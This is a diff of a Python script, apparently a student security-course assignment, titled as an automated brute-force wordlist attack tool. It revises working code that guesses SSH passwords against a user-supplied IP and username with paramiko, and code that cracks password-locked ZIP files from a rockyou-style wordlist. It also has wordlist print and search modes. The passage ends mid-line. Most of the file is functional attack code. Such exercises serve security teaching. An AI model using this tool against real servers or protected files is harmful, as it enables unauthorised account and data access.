@@ -2,10 +2,12 @@
 # Script Name:                  Ops 18 Automated Brute Force Wordlist Attack Tool Part 3 of 3
 # Author:                       Juan Miguel Cano
 # Date of latest revision:      01/31/2024      
-# Purpose:                      Provides modes for interacting with a word list file, allowing users to
-# Purpose cont:                 iterate through the list with delays (simulating a dictionary attack), 
+# Purpose:                      Provides four modes for interacting with a word list file, allowing users to
+# Purpose cont:                 either iterate through the list with delays (simulating a dictionary attack), 
 # Purpose cont:                 search for specific words within the list, authenticate to an SSH server by its IP address,
-# Purpose cont:                 or brute force attack a password-locked zip file.
+# Purpose cont:                 or perform a brute force attack on a password-locked zip file.
+# Resource:                     https://chat.openai.com/share/6fa45c27-3231-47cf-a6fa-3d855cf80f79
+# Team member:                  Rodolfo Gonzalez
 
 import time
 import paramiko
@@ -18,14 +20,12 @@ def offensive_mode(file_path):
     line_count = 0
     try:
         with open(file_path, 'r') as file:
-            while True:
+            for _ in range(max_lines):
                 word = file.readline().strip()
                 if not word:
                     break
                 print(word)
                 line_count += 1
-                if line_count >= max_lines:
-                    break
                 time.sleep(delay)
     except FileNotFoundError:
         print("File not found.")
@@ -35,15 +35,11 @@ def defensive_mode(file_path):
     user_input = input("Enter a word to search: ")
     try:
         with open(file_path, 'r', errors='ignore') as file:
-            while True:
-                line = file.readline()
-                if not line:
-                    break
-                word = line.strip()
-                if user_input == word:
-                    print("The word is in the word list.")
-                    return
-            print("The word is not in the word list.")
+            words = file.read().splitlines()
+            if user_input in words:
+                print("The word is in the word list.")
+            else:
+                print("The word is not in the word list.")
     except FileNotFoundError:
         print("File not found.")
 
@@ -58,11 +54,12 @@ def ssh_brute_force(file_path, ip_address, username):
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 try:
                     ssh.connect(ip_address, username=username, password=password)
-                    print(f"Login successful for password: {password}")
+                    print(f"\033[32mWe found the password: {password}\033[0m")  # Corrected line
                     return
                 except paramiko.AuthenticationException:
-                    print("Authentication failed. Trying next password.")
-                ssh.close()
+                    print("\033[91mAuthentication failed. Trying next password.\033[0m")
+                finally:
+                    ssh.close()
                 time.sleep(1)
     except FileNotFoundError:
         print("File not found.")
@@ -74,17 +71,13 @@ def zip_brute_force(file_path, zip_file_path):
             with open(file_path, 'r') as file:
                 for word in file:
                     password = word.strip()
-                    print(f"Trying password: {password}")
                     try:
                         zf.extractall(pwd=bytes(password, 'utf-8'))
                         print(f"Password found: {password}")
                         return password
-                    except zipfile.BadZipFile:
-                        print(f"Bad zip file: {zip_file_path}")
-                        break
                     except RuntimeError as e:
                         if 'Bad password' in str(e):
-                            pass  # Incorrect password, move to the next
+                            continue  # Incorrect password, move to the next
                         else:
                             print(f"Runtime error: {e}")
                             break
@@ -94,8 +87,8 @@ def zip_brute_force(file_path, zip_file_path):
         print(f"Bad zip file or format not supported by zipfile module: {zip_file_path}")
 
 if __name__ == "__main__":
-    mode = input("Select a mode (1 for Offensive, 2 for Defensive, 3 for SSH Brute Force, 4 for ZIP Brute Force): ")
-    file_path = "smaller_rockyou.txt"  # Use the smaller wordlist file as the wordlist
+    mode = input("Select a mode\n (\033[95m 1 for Offensive\033[0m], \033[92m2 for Defensive\033[0m], \033[94m3 for SSH Brute Force\033[0m], \033[96m4 for ZIP Brute Force): \033[0m")
+    file_path = input("Enter the path of the word list file: ")  # Ask for the word list file path
 
     if mode == '1':
         offensive_mode(file_path)
@@ -107,10 +100,4 @@ if __name__ == "__main__":
         ssh_brute_force(file_path, ip_address, username)
     elif mode == '4':
         zip_file_path = input("Enter the path of the ZIP file: ")
-        result = zip_brute_force(file_path, zip_file_path)
-        if result:
-            print(f"Success! The password for the ZIP file is: {result}")
-        else:
-            print("Failed to find the password for the ZIP file. Try another wordlist.")
-    else:
-        print
+        result = zip_brute
